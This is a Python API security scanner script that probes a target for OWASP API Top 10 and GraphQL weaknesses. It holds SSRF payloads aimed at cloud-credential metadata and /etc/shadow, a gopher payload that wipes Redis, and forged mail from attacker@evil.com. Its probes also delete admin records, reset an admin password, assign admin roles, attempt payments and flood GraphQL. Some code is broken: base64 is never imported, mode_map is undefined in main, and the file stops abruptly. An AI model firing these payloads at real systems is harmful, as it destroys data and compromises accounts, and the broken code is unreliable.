#!/usr/bin/env python3
"""
API Security Scanner v2 - OWASP API Top 10 2023 + GraphQL
REAL detection logic for BOLA, BFLA, SSRF, introspection, depth DoS, batching, auth bypass
"""
import requests, sys, json, argparse, time, re, uuid, random, string
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse, parse_qs
requests.packages.urllib3.disable_warnings()

VERSION = "2.0.0"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

BANNER = """
╔═══════════════════════════════════════════════════════════════════════════════╗
║        API Security Scanner v2.0 - OWASP API Top 10 2023 + GraphQL          ║
║     BOLA, BFLA, SSRF, GraphQL Introspection, Depth DoS, Batching, Auth      ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""

# ═══════════════════════════════════════════════════════════════════════════════
# PAYLOAD LIBRARIES
# ═══════════════════════════════════════════════════════════════════════════════

SSRF_PAYLOADS = [
    # Cloud metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data",
    "http://169.254.169.254/latest/dynamic/instance-identity/document",
    # Azure
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    # GCP
    "http://metadata.google.internal/computeMetadata/v1/",
    # Localhost/internal
    "http://localhost:22",
    "http://127.0.0.1:22",
    "http://127.0.0.1:3306",
    "http://127.0.0.1:5432",
    "http://127.0.0.1:6379",
    "http://127.0.0.1:9200",
    "http://[::1]:22",
    "http://[::1]:3306",
    # File protocol
    "file:///etc/passwd",
    "file:///etc/shadow",
    "file:///etc/hosts",
    "file:///proc/self/environ",
    "file:///proc/version",
    "file:///proc/cmdline",
    "file:///proc/self/cmdline",
    "file:///proc/self/maps",
    "file:///proc/net/tcp",
    # Gopher
    "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",
    "gopher://127.0.0.1:25/_HELO%20localhost%250d%250aMAIL%20FROM%3A%3Cattacker%40evil.com%3E%250d%250aRCPT%20TO%3A%3Cvictim%40target.com%3E%250d%250aDATA%250d%250aSubject%3A%20Test%250d%250d%250aBody%250d%250a.%250d%250aQUIT%250d%250a",
    # Dict
    "dict://127.0.0.1:6379/INFO",
    # LDAP
    "ldap://127.0.0.1:389/",
    # Custom internal IPs
    "http://10.0.0.1",
    "http://10.0.0.2",
    "http://172.16.0.1",
    "http://192.168.1.1",
    # DNS rebinding style
    "http://localhost.evil.com",
    "http://127.0.0.1.evil.com",
]

BOLA_TEST_ENDPOINTS = [
    "/api/v1/users/{id}",
    "/api/v1/accounts/{id}",
    "/api/v1/orders/{id}",
    "/api/v1/documents/{id}",
    "/api/v1/files/{id}",
    "/api/v1/profile/{id}",
    "/api/v1/settings/{id}",
    "/api/v1/addresses/{id}",
    "/api/v1/payments/{id}",
    "/api/v1/subscriptions/{id}",
    "/api/v1/invoices/{id}",
    "/api/v1/tickets/{id}",
    "/api/v1/projects/{id}",
    "/api/v1/tasks/{id}",
    "/api/v1/comments/{id}",
]

BFLA_ADMIN_ENDPOINTS = [
    "/api/v1/admin/users",
    "/api/v1/admin/users/{id}",
    "/api/v1/admin/users/{id}/delete",
    "/api/v1/admin/users/{id}/role",
    "/api/v1/admin/roles",
    "/api/v1/admin/roles/{id}",
    "/api/v1/admin/permissions",
    "/api/v1/admin/audit-logs",
    "/api/v1/admin/system-config",
    "/api/v1/admin/feature-flags",
    "/api/v1/admin/impersonate/{id}",
    "/api/v1/admin/backup",
    "/api/v1/admin/maintenance",
    "/api/v1/management/users",
    "/api/v1/management/roles",
    "/api/v1/internal/users",
    "/api/v1/internal/admin",
    "/api/v1/debug/users",
    "/api/v1/debug/config",
    "/api/v1/actuator",
    "/api/v1/actuator/env",
    "/api/v1/actuator/health",
    "/api/v1/actuator/metrics",
    "/api/v1/actuator/loggers",
    "/api/v1/actuator/mappings",
]

GRAPHQL_INTROSPECTION_QUERY = {
    "query": """
    query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
          ...FullType
        }
        directives {
          name
          description
          locations
          args {
            ...InputValue
          }
        }
      }
    }
    fragment FullType on __Type {
      kind
      name
      description
      fields(includeDeprecated: true) {
        name
        description
        args {
          ...InputValue
        }
        type {
          ...TypeRef
        }
        isDeprecated
        deprecationReason
      }
      inputFields {
        ...InputValue
      }
      interfaces {
        ...TypeRef
      }
      enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
      }
      possibleTypes {
        ...TypeRef
      }
    }
    fragment InputValue on __InputValue {
      name
      description
      type { ...TypeRef }
      defaultValue
    }
    fragment TypeRef on __Type {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                  ofType {
                    kind
                    name
                  }
                }
              }
            }
          }
        }
      }
    }
    """
}

GRAPHQL_DEPTH_DOS_QUERIES = [
    # Depth 10
    "{user{friends{friends{friends{friends{friends{friends{friends{friends{friends{name}}}}}}}}}}",
    # Depth 15
    "{user{friends{friends{friends{friends{friends{friends{friends{friends{friends{friends{friends{friends{friends{friends{friends{name}}}}}}}}}}}}}}}}",
    # Breadth
    "{user{posts{comments{author{posts{comments{author{name}}}}}}}}",
    # Circular via fragments
    "fragment A on User { friends { ...B } } fragment B on User { friends { ...A } } query { user { ...A } }",
]

GRAPHQL_BATCH_QUERIES = [
    [{"query": "{user{id}}"} for _ in range(50)],
    [{"query": "{user{id}}"} for _ in range(100)],
    [{"query": "{__typename}"} for _ in range(200)],
]

GRAPHQL_FIELD_DUPLICATION = """
query {
  user(id: "1") {
    id
    id
    id
    id
    id
    id
    id
    id
    id
    id
    name
    name
    name
    name
    name
    email
    email
    email
  }
}
"""

GRAPHQL_ALIAS_OVERLOADING = """
query {
  """ + "\n  ".join([f"u{i}: user(id: \"1\") {{ id name email }}" for i in range(100)]) + """
}
"""

GRAPHQL_DIRECTIVE_OVERRIDE = """
query {
  user @skip(if: false) { id }
  user @include(if: true) { id }
  user @deprecated(reason: "test") { id }
}
"""

GRAPHQL_TYPE_CONFUSION = """
query {
  user(id: "1") {
    ... on User { id }
    ... on Admin { secretKey }
    ... on Internal { debugInfo }
  }
}
"""

def http_request(method, url, headers, json_data=None, params=None, data=None, timeout=15, allow_redirects=True, verify=False):
    try:
        return requests.request(method, url, headers=headers, json=json_data, params=params, data=data, timeout=timeout, verify=verify, allow_redirects=allow_redirects)
    except Exception as e:
        return None

def generate_random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

# ═══════════════════════════════════════════════════════════════════════════════
# DETECTION ENGINES
# ═══════════════════════════════════════════════════════════════════════════════

class APISecurityEngine:
    def __init__(self, base_url, auth_header=None, headers=None):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({"User-Agent": UA})
        if headers:
            self.session.headers.update(headers)
        if auth_header:
            self.session.headers["Authorization"] = auth_header
        self.findings = {}
        self.discovered_endpoints = set()
        self.authenticated_user_id = None
        self.second_user_id = None
        self.second_user_session = None
    
    def _request(self, method, path, **kwargs):
        url = urljoin(self.base_url + '/', path.lstrip('/'))
        try:
            return self.session.request(method, url, timeout=15, verify=False, **kwargs)
        except Exception as e:
            return None
    
    def discover_endpoints(self):
        """Passive endpoint discovery"""
        common_paths = [
            "/api", "/api/v1", "/api/v2", "/v1", "/v2",
            "/graphql", "/graphql/", "/api/graphql",
            "/swagger.json", "/openapi.json", "/api-docs",
            "/swagger-ui.html", "/redoc",
            "/actuator", "/actuator/health", "/actuator/env",
            "/metrics", "/prometheus", "/health", "/healthz",
            "/debug", "/debug/pprof", "/debug/vars",
        ]
        
        for path in common_paths:
            r = self._request("GET", path)
            if r and r.status_code < 400:
                self.discovered_endpoints.add(path)
        
        # Try to find API version
        for v in ["v1", "v2", "v3", "v4", "api"]:
            r = self._request("GET", f"/{v}/users")
            if r and r.status_code == 200:
                self.discovered_endpoints.add(f"/{v}/users")
    
    def create_second_user_session(self, auth_header=None):
        """Create a second session for BOLA testing"""
        self.second_user_session = requests.Session()
        self.second_user_session.verify = False
        self.second_user_session.headers.update({"User-Agent": UA})
        if auth_header:
            self.second_user_session.headers["Authorization"] = auth_header
    
    # ══════════════════════════════════════════════════════════════════════════════
    # API1:2023 - Broken Object Level Authorization (BOLA/IDOR)
    # ═══════════════════════════════════════════════════════════════════════════════
    
    def check_bola(self, object_ids=None):
        """Check for BOLA/IDOR across discovered endpoints"""
        results = {"vulnerable": False, "details": [], "endpoints_tested": 0, "successful": []}
        
        if not object_ids:
            object_ids = ["1", "2", "3", "4", "5", "admin", "test", "100", "999"]
        
        # Test each discovered endpoint with ID parameter
        for endpoint in list(self.discovered_endpoints):
            if "{id}" not in endpoint and not endpoint.endswith("/"):
                # Try to append ID
                test_paths = [f"{endpoint}/{oid}" for oid in object_ids[:5]]
            else:
                test_paths = [endpoint.format(id=oid) for oid in object_ids[:5]]
            
            for test_path in test_paths:
                results["endpoints_tested"] += 1
                
                # Primary user request
                r1 = self._request("GET", test_path)
                if not r1 or r1.status_code != 200:
                    continue
                
                # Try to access with second user session (if available)
                if self.second_user_session:
                    try:
                        r2 = self.second_user_session.get(
                            urljoin(self.base_url + '/', test_path.lstrip('/')),
                            timeout=15, verify=False
                        )
                        if r2 and r2.status_code == 200:
                            # Compare responses - if different user sees same data, BOLA
                            if r1.text == r2.text and len(r1.text) > 50:
                                results["vulnerable"] = True
                                results["successful"].append({
                                    "endpoint": test_path,
                                    "method": "GET",
                                    "evidence": "Second user accessed same resource"
                                })
                                results["details"].append(f"BOLA: {test_path} accessible by different user")
                                continue
                    except:
                        pass
                
                # Try IDOR by incrementing/decrementing ID
                for oid in object_ids:
                    if str(oid) in test_path:
                        for test_oid in [str(int(oid)+1), str(int(oid)-1), "1", "2", "admin"]:
                            if test_oid == str(oid):
                                continue
                            test_path2 = test_path.replace(str(oid), test_oid)
                            r3 = self._request("GET", test_path2)
                            if r3 and r3.status_code == 200 and len(r3.text) > 50:
                                results["vulnerable"] = True
                                results["successful"].append({
                                    "endpoint": test_path2,
                                    "original": test_path,
                                    "method": "GET",
                                    "evidence": f"IDOR: accessed {test_oid} from {oid}"
                                })
                                results["details"].append(f"IDOR: {test_path2} accessible via ID manipulation")
                                break
                        break
        
        return results
    
    # ══════════════════════════════════════════════════════════════════════════════
    # API2:2023 - Broken Authentication
    # ═══════════════════════════════════════════════════════════════════════════════
    
    def check_broken_auth(self):
        """Check for authentication bypass, weak JWT, credential stuffing"""
        results = {"vulnerable": False, "details": [], "checks": []}
        
        # Test 1: No auth on protected endpoints
        for endpoint in self.discovered_endpoints:
            if "admin" in endpoint or "internal" in endpoint or "management" in endpoint:
                # Temporarily remove auth
                temp_session = requests.Session()
                temp_session.verify = False
                temp_session.headers.update({"User-Agent": UA})
                
                r = temp_session.get(urljoin(self.base_url + '/', endpoint.lstrip('/')), timeout=10, verify=False)
                if r and r.status_code == 200:
                    results["vulnerable"] = True
                    results["checks"].append({"type": "missing_auth", "endpoint": endpoint, "status": r.status_code})
                    results["details"].append(f"Missing auth: {endpoint} returns 200 without credentials")
        
        # Test 2: JWT algorithm confusion
        if "Authorization" in self.session.headers:
            auth = self.session.headers["Authorization"]
            if auth.startswith("Bearer "):
                token = auth[7:]
                # Test none algorithm
                try:
                    parts = token.split('.')
                    if len(parts) == 3:
                        header = json.loads(base64.urlsafe_b64decode(parts[0] + '==').decode())
                        header["alg"] = "none"
                        new_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
                        none_token = f"{new_header}.{parts[1]}."
                        
                        temp_session = requests.Session()
                        temp_session.verify = False
                        temp_session.headers.update({"User-Agent": UA, "Authorization": f"Bearer {none_token}"})
                        
                        r = temp_session.get(urljoin(self.base_url + '/', list(self.discovered_endpoints)[0].lstrip('/')), timeout=10, verify=False)
                        if r and r.status_code == 200:
                            results["vulnerable"] = True
                            results["checks"].append({"type": "jwt_none_algorithm", "endpoint": "test"})
                            results["details"].append("JWT 'none' algorithm accepted")
                except:
                    pass
        
        # Test 3: Default/weak credentials
        default_creds = [
            ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
            ("admin", ""), ("root", "root"), ("root", "admin"),
            ("test", "test"), ("user", "user"), ("guest", "guest"),
        ]
        
        login_endpoints = [e for e in self.discovered_endpoints if "login" in e or "auth" in e or "token" in e]
        for endpoint in login_endpoints[:3]:
            for user, pwd in default_creds[:5]:
                r = self._request("POST", endpoint, json={"username": user, "password": pwd})
                if r and r.status_code == 200 and ("token" in r.text or "access_token" in r.text or "jwt" in r.text):
                    results["vulnerable"] = True
                    results["checks"].append({"type": "weak_credentials", "endpoint": endpoint, "credentials": f"{user}:{pwd}"})
                    results["details"].append(f"Weak credentials: {endpoint} accepts {user}:{pwd}")
                    break
        
        return results
    
    # ══════════════════════════════════════════════════════════════════════════════
    # API3:2023 - Broken Object Property Level Authorization
    # ══════════════════════════════════════════════════════════════════════════════
    
    def check_property_auth(self):
        """Check for mass assignment, excessive data exposure"""
        results = {"vulnerable": False, "details": [], "checks": []}
        
        # Test mass assignment on user endpoints
        user_endpoints = [e for e in self.discovered_endpoints if "user" in e or "account" in e or "profile" in e]
        
        for endpoint in user_endpoints[:3]:
            # Try to update sensitive fields
            sensitive_payloads = [
                {"role": "admin", "isAdmin": True, "is_admin": True, "admin": True},
                {"permissions": ["admin", "root", "superuser"], "scopes": ["*"]},
                {"userId": 1, "id": 1, "accountId": 1},
                {"email": "attacker@evil.com", "password": "hacked", "isActive": True},
                {"balance": 999999, "creditLimit": 999999, "isPremium": True},
                {"isDeleted": False, "deletedAt": None, "status": "active"},
            ]
            
            for payload in sensitive_payloads:
                r = self._request("PATCH", endpoint, json=payload)
                if r and r.status_code in [200, 201, 204]:
                    # Check if fields were actually updated
                    r2 = self._request("GET", endpoint)
                    if r2 and r2.status_code == 200:
                        try:
                            resp = r2.json()
                            for key in payload:
                                if key in str(resp).lower():
                                    results["vulnerable"] = True
                                    results["checks"].append({"type": "mass_assignment", "endpoint": endpoint, "field": key})
                                    results["details"].append(f"Mass assignment: {endpoint} accepts sensitive field '{key}'")
                        except:
                            pass
        
        return results
    
    # ══════════════════════════════════════════════════════════════════════════════
    # API4:2023 - Unrestricted Resource Consumption
    # ═══════════════════════════════════════════════════════════════════════════════
    
    def check_resource_consumption(self):
        """Check for DoS via large payloads, pagination abuse, rate limiting"""
        results = {"vulnerable": False, "details": [], "checks": []}
        
        # Test 1: Large payload
        large_payload = {"data": "A" * 1000000}  # 1MB
        for endpoint in list(self.discovered_endpoints)[:3]:
            r = self._request("POST", endpoint, json=large_payload)
            if r and r.status_code in [200, 201]:
                results["vulnerable"] = True
                results["checks"].append({"type": "large_payload", "endpoint": endpoint, "size_mb": 1})
                results["details"].append(f"Large payload accepted: {endpoint} accepts 1MB payload")
        
        # Test 2: Pagination abuse
        list_endpoints = [e for e in self.discovered_endpoints if not e.endswith("/{id}") and "user" in e or "list" in e or "search" in e]
        for endpoint in list_endpoints[:3]:
            for limit in [1000, 10000, 100000, 999999]:
                r = self._request("GET", endpoint, params={"limit": limit, "page": 1})
                if r and r.status_code == 200:
                    try:
                        data = r.json()
                        if isinstance(data, list) and len(data) > 100:
                            results["vulnerable"] = True
                            results["checks"].append({"type": "pagination_abuse", "endpoint": endpoint, "limit": limit, "returned": len(data)})
                            results["details"].append(f"Pagination abuse: {endpoint} returns {len(data)} items with limit={limit}")
                            break
                    except:
                        pass
        
        # Test 3: Rate limiting
        endpoint = list(self.discovered_endpoints)[0] if self.discovered_endpoints else "/api/v1/users"
        for i in range(50):
            r = self._request("GET", endpoint)
            if r and r.status_code == 429:
                break
        else:
            results["vulnerable"] = True
            results["checks"].append({"type": "no_rate_limit", "endpoint": endpoint})
            results["details"].append(f"No rate limiting: {endpoint} allows 50+ rapid requests")
        
        return results
    
    # ══════════════════════════════════════════════════════════════════════════════
    # API5:2023 - Broken Function Level Authorization
    # ═══════════════════════════════════════════════════════════════════════════════
    
    def check_bfla(self):
        """Check for BFLA on admin/management endpoints"""
        results = {"vulnerable": False, "details": [], "checks": []}
        
        for endpoint in BFLA_ADMIN_ENDPOINTS:
            r = self._request("GET", endpoint)
            if r and r.status_code in [200, 201]:
                results["vulnerable"] = True
                results["checks"].append({"type": "bfla", "endpoint": endpoint, "method": "GET", "status": r.status_code})
                results["details"].append(f"BFLA: {endpoint} accessible with user privileges (status {r.status_code})")
            
            # Also test POST/DELETE/PUT
            for method in ["POST", "DELETE", "PUT", "PATCH"]:
                r = self._request(method, endpoint, json={"test": "data"})
                if r and r.status_code in [200, 201, 204]:
                    results["vulnerable"] = True
                    results["checks"].append({"type": "bfla", "endpoint": endpoint, "method": method, "status": r.status_code})
                    results["details"].append(f"BFLA: {endpoint} allows {method} (status {r.status_code})")
        
        return results
    
    # ══════════════════════════════════════════════════════════════════════════════
    # API6:2023 - Unrestricted Access to Sensitive Business Flows
    # ══════════════════════════════════════════════════════════════════════════════
    
    def check_sensitive_flows(self):
        """Check for unrestricted business logic flows"""
        results = {"vulnerable": False, "details": [], "checks": []}
        
        sensitive_flows = [
            ("/api/v1/payments", "POST", {"amount": 0.01, "currency": "USD", "recipient": "attacker"}),
            ("/api/v1/transfers", "POST", {"fromAccount": 1, "toAccount": 999, "amount": 1000}),
            ("/api/v1/withdraw", "POST", {"amount": 10000, "currency": "BTC", "address": "attacker_wallet"}),
            ("/api/v1/purchase", "POST", {"productId": 1, "quantity": -100, "coupon": "FREE100"}),
            ("/api/v1/refund", "POST", {"orderId": 1, "amount": 999999, "reason": "test"}),
            ("/api/v1/coupons/apply", "POST", {"code": "ADMIN100", "cartTotal": 1000}),
            ("/api/v1/invite", "POST", {"email": "attacker@evil.com", "role": "admin"}),
            ("/api/v1/reset-password", "POST", {"email": "admin@target.com", "newPassword": "hacked123"}),
            ("/api/v1/delete-account", "POST", {"confirm": True, "reason": "test"}),
        ]
        
        for endpoint, method, payload in sensitive_flows:
            r = self._request(method, endpoint, json=payload)
            if r and r.status_code in [200, 201, 202]:
                results["vulnerable"] = True
                results["checks"].append({"type": "sensitive_flow", "endpoint": endpoint, "method": method, "status": r.status_code})
                results["details"].append(f"Unrestricted flow: {method} {endpoint} succeeded without proper authorization")
        
        return results
    
    # ══════════════════════════════════════════════════════════════════════════════
    # API7:2023 - Server Side Request Forgery (SSRF)
    # ═══════════════════════════════════════════════════════════════════════════════
    
    def check_ssrf(self):
        """Check for SSRF in webhook, URL fetch, import endpoints"""
        results = {"vulnerable": False, "details": [], "checks": []}
        
        ssrf_endpoints = [
            ("/api/v1/webhook", "POST", {"url": None}),
            ("/api/v1/import", "POST", {"url": None, "source": None}),
            ("/api/v1/fetch", "POST", {"url": None, "uri": None, "link": None}),
            ("/api/v1/avatar", "POST", {"url": None, "avatar_url": None, "image_url": None}),
            ("/api/v1/import/csv", "POST", {"file_url": None}),
            ("/api/v1/import/json", "POST", {"url": None}),
            ("/api/v1/scan", "POST", {"target": None, "url": None}),
            ("/api/v1/validate", "POST", {"url": None, "callback_url": None}),
            ("/api/v1/webhook/register", "POST", {"url": None, "callback": None}),
            ("/api/v1/integrations/webhook", "POST", {"url": None}),
        ]
        
        for endpoint, method, template in ssrf_endpoints:
            for payload in SSRF_PAYLOADS[:15]:
                payload_data = template.copy()
                for key in template:
                    if template[key] is None:
                        payload_data[key] = payload
                        break
                
                r = self._request(method, endpoint, json=payload_data)
                if r and r.status_code in [200, 201, 202]:
                    results["vulnerable"] = True
                    results["checks"].append({"type": "ssrf", "endpoint": endpoint, "payload": payload[:80], "status": r.status_code})
                    results["details"].append(f"SSRF: {endpoint} accepts {payload[:60]}")
                    break
        
        # Test parameter pollution for SSRF
        r = self._request("GET", "/api/v1/users", params={"url": "http://169.254.169.254/latest/meta-data/"})
        if r and r.status_code == 200:
            results["vulnerable"] = True
            results["checks"].append({"type": "ssrf_param_pollution", "endpoint": "/api/v1/users"})
            results["details"].append("SSRF via parameter pollution on user list endpoint")
        
        return results
    
    # ══════════════════════════════════════════════════════════════════════════════
    # API8:2023 - Security Misconfiguration
    # ═══════════════════════════════════════════════════════════════════════════════
    
    def check_misconfiguration(self):
        """Check for security misconfigurations"""
        results = {"vulnerable": False, "details": [], "checks": []}
        
        # Test 1: Debug endpoints
        debug_endpoints = ["/actuator", "/actuator/env", "/actuator/health", "/actuator/metrics", "/actuator/loggers", 
                          "/debug", "/debug/pprof", "/debug/vars", "/.env", "/config", "/.git/config"]
        
        for endpoint in debug_endpoints:
            r = self._request("GET", endpoint)
            if r and r.status_code == 200:
                results["vulnerable"] = True
                results["checks"].append({"type": "debug_endpoint", "endpoint": endpoint})
                results["details"].append(f"Debug endpoint exposed: {endpoint}")
        
        # Test 2: CORS misconfiguration
        r = self._request("OPTIONS", "/api/v1/users", headers={"Origin": "https://evil.com", "Access-Control-Request-Method": "GET"})
        if r and r.status_code == 200:
            acao = r.headers.get("Access-Control-Allow-Origin", "")
            acac = r.headers.get("Access-Control-Allow-Credentials", "")
            if acao == "*" or acao == "https://evil.com":
                if acac == "true":
                    results["vulnerable"] = True
                    results["checks"].append({"type": "cors_wildcard_credentials", "endpoint": "CORS"})
                    results["details"].append("CORS: Wildcard origin with credentials allowed")
                elif acao == "https://evil.com":
                    results["vulnerable"] = True
                    results["checks"].append({"type": "cors_reflected_origin", "endpoint": "CORS"})
                    results["details"].append("CORS: Arbitrary origin reflected")
        
        # Test 3: HTTP methods
        r = self._request("OPTIONS", "/api/v1/users")
        if r:
            allow = r.headers.get("Allow", "")
            dangerous = ["PUT", "DELETE", "PATCH", "TRACE", "CONNECT"]
            for m in dangerous:
                if m in allow:
                    results["vulnerable"] = True
                    results["checks"].append({"type": "dangerous_http_method", "method": m})
                    results["details"].append(f"Dangerous HTTP method allowed: {m}")
        
        # Test 4: Version disclosure
        for header in ["Server", "X-Powered-By", "X-AspNet-Version", "X-AspNetMvc-Version", "X-Runtime"]:
            if header in self.session.headers:
                results["vulnerable"] = True
                results["checks"].append({"type": "version_disclosure", "header": header})
                results["details"].append(f"Version disclosure via {header}: {self.session.headers[header]}")
        
        # Test 5: Missing security headers
        r = self._request("GET", "/")
        security_headers = {
            "Strict-Transport-Security": "HSTS missing",
            "Content-Security-Policy": "CSP missing",
            "X-Frame-Options": "X-Frame-Options missing",
            "X-Content-Type-Options": "X-Content-Type-Options missing",
            "Referrer-Policy": "Referrer-Policy missing",
            "Permissions-Policy": "Permissions-Policy missing",
        }
        for header, msg in security_headers.items():
            if header not in r.headers:
                results["vulnerable"] = True
                results["checks"].append({"type": "missing_security_header", "header": header})
                results["details"].append(msg)
        
        return results
    
    # ══════════════════════════════════════════════════════════════════════════════
    # API9:2023 - Improper Inventory Management
    # ══════════════════════════════════════════════════════════════════════════════
    
    def check_inventory(self):
        """Check for API inventory issues"""
        results = {"vulnerable": False, "details": [], "checks": []}
        
        # Test 1: Deprecated/old API versions
        for v in ["v0", "v1", "v2", "v3", "v4", "v5", "v6", "v7", "v8", "v9", "v10"]:
            r = self._request("GET", f"/api/{v}/users")
            if r and r.status_code == 200:
                results["vulnerable"] = True
                results["checks"].append({"type": "old_api_version", "version": v})
                results["details"].append(f"Old API version accessible: /api/{v}/")
        
        # Test 2: Swagger/OpenAPI exposure
        for path in ["/swagger.json", "/openapi.json", "/api-docs", "/api/swagger.json", "/v1/api-docs"]:
            r = self._request("GET", path)
            if r and r.status_code == 200:
                results["vulnerable"] = True
                results["checks"].append({"type": "openapi_exposed", "path": path})
                results["details"].append(f"OpenAPI/Swagger spec exposed: {path}")
        
        # Test 3: Hidden/undocumented endpoints
        # Check for common hidden paths
        hidden_paths = ["/api/internal", "/api/admin", "/api/debug", "/api/test", "/api/dev", "/api/staging"]
        for path in hidden_paths:
            r = self._request("GET", path)
            if r and r.status_code < 400:
                results["vulnerable"] = True
                results["checks"].append({"type": "hidden_endpoint", "path": path})
                results["details"].append(f"Hidden/undocumented endpoint: {path}")
        
        return results
    
    # ══════════════════════════════════════════════════════════════════════════════
    # API10:2023 - Unsafe Consumption of APIs
    # ══════════════════════════════════════════════════════════════════════════════
    
    def check_unsafe_consumption(self):
        """Check for unsafe third-party API consumption"""
        results = {"vulnerable": False, "details": [], "checks": []}
        
        # This is harder to test automatically, but we can check for:
        # - Outbound requests to untrusted domains
        # - Lack of validation on third-party responses
        
        # Check if API makes callbacks to user-supplied URLs (already in SSRF)
        # Check for webhook signature verification
        r = self._request("POST", "/api/v1/webhook", json={"url": "http://evil.com", "secret": "test"})
        if r and r.status_code == 200:
            results["vulnerable"] = True
            results["checks"].append({"type": "webhook_no_verification", "endpoint": "/api/v1/webhook"})
            results["details"].append("Webhook endpoint doesn't verify signatures")
        
        return results
    
    # ══════════════════════════════════════════════════════════════════════════════
    # GRAPHQL SPECIFIC CHECKS
    # ═══════════════════════════════════════════════════════════════════════════════
    
    def check_graphql(self):
        """Comprehensive GraphQL security checks"""
        results = {"vulnerable": False, "details": [], "checks": []}
        
        graphql_endpoints = ["/graphql", "/graphql/", "/api/graphql", "/api/v1/graphql", "/gql", "/query"]
        
        for endpoint in graphql_endpoints:
            # Test 1: Introspection
            r = self._request("POST", endpoint, json=GRAPHQL_INTROSPECTION_QUERY)
            if r and r.status_code == 200 and "__schema" in r.text:
                results["vulnerable"] = True
                results["checks"].append({"type": "graphql_introspection", "endpoint": endpoint})
                results["details"].append(f"GraphQL introspection enabled: {endpoint}")
            
            # Test 2: Depth DoS
            for query in GRAPHQL_DEPTH_DOS_QUERIES[:2]:
                r = self._request("POST", endpoint, json={"query": query})
                if r and r.status_code == 200 and "errors" not in r.text.lower():
                    results["vulnerable"] = True
                    results["checks"].append({"type": "graphql_depth_dos", "endpoint": endpoint})
                    results["details"].append(f"GraphQL depth limit not enforced: {endpoint}")
                    break
            
            # Test 3: Batching
            for batch in GRAPHQL_BATCH_QUERIES[:2]:
                r = self._request("POST", endpoint, json=batch)
                if r and r.status_code == 200:
                    results["vulnerable"] = True
                    results["checks"].append({"type": "graphql_batching", "endpoint": endpoint, "batch_size": len(batch)})
                    results["details"].append(f"GraphQL batching allows {len(batch)} queries: {endpoint}")
                    break
            
            # Test 4: Field duplication
            r = self._request("POST", endpoint, json={"query": GRAPHQL_FIELD_DUPLICATION})
            if r and r.status_code == 200 and "errors" not in r.text.lower():
                results["vulnerable"] = True
                results["checks"].append({"type": "graphql_field_duplication", "endpoint": endpoint})
                results["details"].append(f"GraphQL field duplication allowed: {endpoint}")
            
            # Test 5: Alias overloading
            r = self._request("POST", endpoint, json={"query": GRAPHQL_ALIAS_OVERLOADING})
            if r and r.status_code == 200:
                results["vulnerable"] = True
                results["checks"].append({"type": "graphql_alias_overloading", "endpoint": endpoint})
                results["details"].append(f"GraphQL alias overloading (100+ aliases): {endpoint}")
            
            # Test 6: Directive override
            r = self._request("POST", endpoint, json={"query": GRAPHQL_DIRECTIVE_OVERRIDE})
            if r and r.status_code == 200:
                results["vulnerable"] = True
                results["checks"].append({"type": "graphql_directive_override", "endpoint": endpoint})
                results["details"].append(f"GraphQL directive override allowed: {endpoint}")
            
            # Test 7: Type confusion
            r = self._request("POST", endpoint, json={"query": GRAPHQL_TYPE_CONFUSION})
            if r and r.status_code == 200:
                try:
                    data = r.json()
                    if "data" in data and "user" in data["data"]:
                        user = data["data"]["user"]
                        if any(k in user for k in ["secretKey", "debugInfo"]):
                            results["vulnerable"] = True
                            results["checks"].append({"type": "graphql_type_confusion", "endpoint": endpoint})
                            results["details"].append(f"GraphQL type confusion exposes internal fields: {endpoint}")
                except:
                    pass
        
        return results

def scan_api(base_url, auth_header=None, modes=None, extra_headers=None, timeout=300):
    engine = APISecurityEngine(base_url, auth_header, extra_headers)
    
    print(f"[*] Discovering endpoints on {base_url}...")
    engine.discover_endpoints()
    print(f"[*] Discovered {len(engine.discovered_endpoints)} endpoints")
    
    all_results = {"target": base_url, "findings": {}}
    
    mode_map = {
        "bola": "check_bola",
        "auth": "check_broken_auth",
        "property": "check_property_auth",
        "resource": "check_resource_consumption",
        "bfla": "check_bfla",
        "flows": "check_sensitive_flows",
        "ssrf": "check_ssrf",
        "misconfig": "check_misconfiguration",
        "inventory": "check_inventory",
        "consumption": "check_unsafe_consumption",
        "graphql": "check_graphql",
    }
    
    if not modes:
        modes = list(mode_map.keys())
    
    for mode in modes:
        if mode in mode_map:
            print(f"[*] Running {mode} checks...")
            method = getattr(engine, mode_map[mode])
            all_results["findings"][mode] = method()
    
    return all_results

def main():
    print(BANNER)
    
    parser = argparse.ArgumentParser(description="API Security Scanner v2.0 - OWASP API Top 10 2023 + GraphQL")
    parser.add_argument("--target", required=True, help="API base URL (e.g., https://api.example.com)")
    parser.add_argument("--auth", help="Authorization header value (Bearer token, API key)")
    parser.add_argument("--mode", choices=list(mode_map.keys()) + ["all"], default="all", help="Scan mode")
    parser.add_argument("--headers", help="Extra headers as JSON")
    parser.add_argument("--output", help="Output JSON file")
    parser.add_argument("--timeout", type=int, default=300, help="Timeout in seconds")
    args = parser.parse_args()
    
    extra_headers = {}
    if args.headers:
        try:
            extra_headers = json.loads(args.headers)
        except:
            pass
    
    if args.mode == "all":
        modes = list(mode_map.keys())
    else:
        modes = [args.mode]
    
    print(f"[*] Target: {args.target}")
    print(f"[*] Modes: {', '.join(modes)}\n")
    
    results = scan_api(args.target, args.auth, modes, extra_headers, args.timeout)
    
    total_vulns = sum(1 for v in results["findings"].values() if v.get("vulnerable"))
    total_checks = sum(len(v.get("checks", [])) for v in results["findings"].values())
    
    print(f"\n{'='*70}")
    print(f"SCAN COMPLETE")
